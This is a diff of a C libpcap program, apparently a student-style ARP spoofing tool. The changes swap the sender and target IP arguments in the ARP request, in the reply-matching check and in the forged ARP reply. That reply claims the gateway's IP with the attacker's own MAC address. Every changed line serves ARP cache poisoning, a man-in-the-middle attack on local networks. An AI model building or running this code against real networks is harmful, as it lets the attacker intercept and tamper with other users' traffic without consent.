@@ -122,8 +122,8 @@ int main(int argc, char *argv[])
 
     u_char *sender_ip=argv[2];
     u_char *target_ip=argv[3];
-    u_char target_ip_data[4];
-    inet_pton(AF_INET,target_ip,target_ip_data);
+    u_char sender_ip_data[4];
+    inet_pton(AF_INET,sender_ip,sender_ip_data);
 
     arprequest_eth=(struct sniff_ethernet*)send_packet_arprequest;
     arpreply_eth=(struct sniff_ethernet*)send_packet_arpreply;
@@ -135,7 +135,7 @@ int main(int argc, char *argv[])
     memcpy((*arprequest_eth).ether_shost,my_mac,6);      //my mac
     memcpy((*arprequest_arp).sha,my_mac,6);             //my mac
     memcpy((*arprequest_arp).spa,my_ip,4);          	//senderip-my, i have to get my ip information
-    inet_pton(AF_INET,target_ip,(*arprequest_arp).tpa); //targetip
+    inet_pton(AF_INET,sender_ip,(*arprequest_arp).tpa); //targetip
 
     
     unsigned char target_mac[6]={0xdd,0xdd,0xdd,0xdd,0xdd,0xdd};
@@ -196,7 +196,7 @@ int main(int argc, char *argv[])
                 arp_to_know_targetmac=(struct arphdr*)(packet+14);
                 if(ntohs((*arp_to_know_targetmac).oper)==0x0002)
                 {
-                    if(!strcmp((*arp_to_know_targetmac).spa,target_ip_data))
+                    if(!strcmp((*arp_to_know_targetmac).spa,sender_ip_data))
                     {
                         memcpy(target_mac,(*arp_to_know_targetmac).sha,6);
                     }
@@ -208,9 +208,9 @@ int main(int argc, char *argv[])
             memcpy((*arpreply_eth).ether_dhost,target_mac,6);
             memcpy((*arpreply_eth).ether_shost,my_mac,6);       //my mac
             memcpy((*arpreply_arp).sha,my_mac,6);               //my mac
-            inet_pton(AF_INET,sender_ip,(*arpreply_arp).spa);   //sender ip - gateway
+            inet_pton(AF_INET,target_ip,(*arpreply_arp).spa);   //sender ip - gateway
             memcpy((*arpreply_arp).tha,target_mac,6);
-            inet_pton(AF_INET,target_ip,(*arpreply_arp).tpa);    //targetip
+            inet_pton(AF_INET,sender_ip,(*arpreply_arp).tpa);    //targetip
 
             if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
             {
